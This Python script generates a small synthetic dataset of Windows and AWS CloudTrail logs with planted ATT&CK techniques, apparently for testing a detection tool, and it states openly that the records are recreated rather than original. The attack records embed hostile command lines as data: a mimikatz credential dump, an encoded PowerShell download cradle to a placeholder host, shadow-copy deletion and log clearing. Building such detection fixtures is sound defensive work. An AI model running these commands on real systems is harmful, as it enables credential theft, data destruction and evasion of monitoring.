"""Build data/sample/case_public/ : a SMALL, HAND-RECREATED sample in the style of public attack datasets.

IMPORTANT HONESTY NOTE: this sandbox had no internet, so these are NOT the original files from
  * EVTX-ATTACK-SAMPLES  https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES  (Windows .evtx attack samples)
  * Stratus Red Team     https://github.com/DataDog/stratus-red-team         (AWS attack-technique emulation tool)
They are re-created records that follow the same event schema and the same technique behaviour
(e.g. PSEXESVC service install, LSASS access, cloudtrail:StopLogging).  To use the REAL files, run
  python -m vai.evidence.tools.fetch_public_samples
and ingest the downloaded .evtx files (needs: pip install python-evtx).
"""
from __future__ import annotations

import argparse
import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from .generate_case1 import _ct, _logon, _win

UTC = timezone.utc
T0 = datetime(2026, 5, 20, 9, 0, tzinfo=UTC)
LAB_IP = "198.51.100.7"
HOST = "WIN10-LAB"


def _sys(dt, eid, data, host=HOST, channel="Microsoft-Windows-Sysmon/Operational", provider="Microsoft-Windows-Sysmon"):
    return _win(dt, eid, host, data, channel=channel, provider=provider)


def build(out_dir) -> dict:
    rng = random.Random(2026)
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    W: list[tuple] = []   # (dt, record, technique tag or 'noise')
    A: list[tuple] = []
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')".encode("utf-16-le")).decode()

    for i in range(240):                                           # benign noise
        dt = T0 + timedelta(minutes=rng.randrange(0, 600), seconds=rng.randrange(60))
        u = rng.choice(["labuser", "analyst1"])
        k = rng.random()
        if k < 0.4:
            W.append((*_logon(dt, HOST, u, "10.10.10.5", 3), "noise"))
        elif k < 0.55:
            W.append((*_win(dt, 4634, HOST, {"TargetUserName": u, "LogonType": "3"}), "noise"))
        else:
            img = rng.choice([r"C:\Windows\System32\notepad.exe", r"C:\Program Files\Mozilla Firefox\firefox.exe"])
            W.append((*_win(dt, 4688, HOST, {"SubjectUserName": u, "NewProcessName": img, "CommandLine": img}), "noise"))

    t = T0 + timedelta(hours=11)
    attack = [  # (record tuple, technique tags)
        (_sys(t, 1, {"User": "LAB\\labuser", "Image": r"C:\Tools\mimikatz.exe", "ParentImage": r"C:\Windows\System32\cmd.exe",
                     "CommandLine": 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'}), "T1003.001"),
        (_sys(t + timedelta(seconds=5), 10, {"SourceUser": "LAB\\labuser", "SourceImage": r"C:\Tools\mimikatz.exe",
                                             "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1410"}), "T1003.001"),
        (_win(t + timedelta(minutes=3), 7045, HOST, {"ServiceName": "PSEXESVC", "ImagePath": r"%SystemRoot%\PSEXESVC.exe", "ServiceType": "user mode service", "StartType": "demand start"},
              channel="System", provider="Service Control Manager"), "T1543.003,T1569.002"),
        (_win(t + timedelta(minutes=3, seconds=1), 5140, HOST, {"SubjectUserName": "labuser", "IpAddress": "10.10.10.25", "ShareName": r"\\*\ADMIN$"}), "T1021.002"),
        (_win(t + timedelta(minutes=6), 4698, HOST, {"SubjectUserName": "labuser", "TaskName": r"\Updater",
              "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -c calc</Arguments></Exec></Actions></Task>"}), "T1053.005"),
        (_win(t + timedelta(minutes=8), 4720, HOST, {"SubjectUserName": "labuser", "TargetUserName": "support$$"}), "T1136.001"),
        (_win(t + timedelta(minutes=8, seconds=4), 4732, HOST, {"SubjectUserName": "labuser", "TargetUserName": "Administrators", "MemberName": "support$$"}), "T1098"),
        (_win(t + timedelta(minutes=10), 4688, HOST, {"SubjectUserName": "labuser", "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              "CommandLine": f"powershell.exe -nop -w hidden -enc {enc}"}), "T1059.001"),
        (_win(t + timedelta(minutes=12), 4688, HOST, {"SubjectUserName": "labuser", "NewProcessName": r"C:\Windows\System32\vssadmin.exe",
              "CommandLine": "vssadmin.exe delete shadows /all /quiet"}), "T1490"),
        (_win(t + timedelta(minutes=13), 4769, HOST, {"TargetUserName": "labuser@LAB.LOCAL", "ServiceName": "MSSQLSvc", "IpAddress": "::ffff:10.10.10.25",
              "TicketEncryptionType": "0x17", "Status": "0x0"}), "T1558.003"),
        (_win(t + timedelta(minutes=15), 1102, HOST, {"SubjectUserName": "labuser"}), "T1070.001"),
    ]
    W += [(rec[0], rec[1], tag) for rec, tag in attack]

    for i in range(100):                                           # AWS benign lab noise (no S3 GET / logins: see README)
        dt = T0 + timedelta(minutes=rng.randrange(0, 600))
        A.append((*_ct(dt, "stratus-dev", LAB_IP, rng.choice(["DescribeInstances", "ListBuckets", "GetCallerIdentity"]),
                       rng.choice(["ec2.amazonaws.com", "s3.amazonaws.com", "sts.amazonaws.com"]), key="AKIASTRATUSDEMO0001"), "noise"))
    a = T0 + timedelta(hours=12)
    k = "AKIASTRATUSDEMO0001"
    A += [
        (*_ct(a, "stratus-dev", LAB_IP, "GetSecretValue", "secretsmanager.amazonaws.com", {"secretId": "stratus-red-team-secret-1"}, key=k), "T1555.006"),
        (*_ct(a + timedelta(minutes=2), "stratus-dev", LAB_IP, "CreateUser", "iam.amazonaws.com", {"userName": "sample-legit-user"}, key=k), "T1136.003"),
        (*_ct(a + timedelta(minutes=3), "stratus-dev", LAB_IP, "AttachUserPolicy", "iam.amazonaws.com",
              {"userName": "sample-legit-user", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}, key=k), "T1098.003"),
        (*_ct(a + timedelta(minutes=4), "stratus-dev", LAB_IP, "CreateAccessKey", "iam.amazonaws.com", {"userName": "sample-legit-user"}, key=k), "T1098.001"),
        (*_ct(a + timedelta(minutes=6), "stratus-dev", LAB_IP, "StopLogging", "cloudtrail.amazonaws.com", {"name": "stratus-trail"}, key=k), "T1562.008"),
    ]

    W.sort(key=lambda x: x[0])
    truth = {"note": "re-created in the style of EVTX-ATTACK-SAMPLES / Stratus Red Team; not the original files", "records": []}
    with open(out / "windows_attack_samples_style.jsonl", "w", encoding="utf-8") as fh:
        for i, (d, rec, tag) in enumerate(W, 1):
            rec["Event"]["System"]["EventRecordID"] = 5000 + i
            fh.write(json.dumps(rec, separators=(",", ":")) + "\n")
            if tag != "noise":
                truth["records"].append({"source": "windows", "raw_ref": f"windows_attack_samples_style.jsonl#line={i}", "techniques": tag.split(",")})
    A.sort(key=lambda x: x[0])
    for i, (d, rec, tag) in enumerate(A, 1):
        rec["eventID"] = f"pub-{i:06d}"
        if tag != "noise":
            truth["records"].append({"source": "aws", "raw_ref": f"cloudtrail_stratus_style.json#index={i}", "techniques": tag.split(",")})
    (out / "cloudtrail_stratus_style.json").write_text(json.dumps({"Records": [r for _, r, _ in A]}, separators=(",", ":")), encoding="utf-8")
    techs = sorted({t for r in truth["records"] for t in r["techniques"]})
    truth["expected_techniques"] = techs
    (out / "_expected.json").write_text(json.dumps(truth, indent=2), encoding="utf-8")
    (out / "README.md").write_text(README, encoding="utf-8")
    return {"windows": len(W), "aws": len(A), "expected_techniques": techs}


README = """# case_public - demo case 2 (public-data style)

**Read this first (honesty):** the files here are SMALL, HAND-RE-CREATED samples written to look like the
public datasets below. They are **not** copies of the original files (the build sandbox had no internet).

| Public source | What it is | Link |
|---|---|---|
| EVTX-ATTACK-SAMPLES | Windows .evtx logs of ATT&CK techniques (Sysmon + Security) | https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES |
| Stratus Red Team (Datadog) | Tool that *emulates* AWS attack techniques in your own lab account (it does not ship logs) | https://github.com/DataDog/stratus-red-team |
| MITRE ATT&CK | Technique ids used by the findings | https://attack.mitre.org/ |

Files: `windows_attack_samples_style.jsonl` (Windows, evtx_dump-style JSON), `cloudtrail_stratus_style.json` (CloudTrail),
`_expected.json` (planted techniques, used only by tests).

Limitations: one short day of data => no per-user IP baseline, so only rules that do not need a baseline can fire
(no T1078/T1530 here); account/host names are invented; check each dataset's licence before redistributing the real files.

Use the REAL data: `python -m vai.evidence.tools.fetch_public_samples` (needs git; reading .evtx needs `pip install python-evtx`).
"""


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--out", default="data/sample/case_public")
    print(json.dumps(build(ap.parse_args().out), indent=2))


if __name__ == "__main__":
    main()
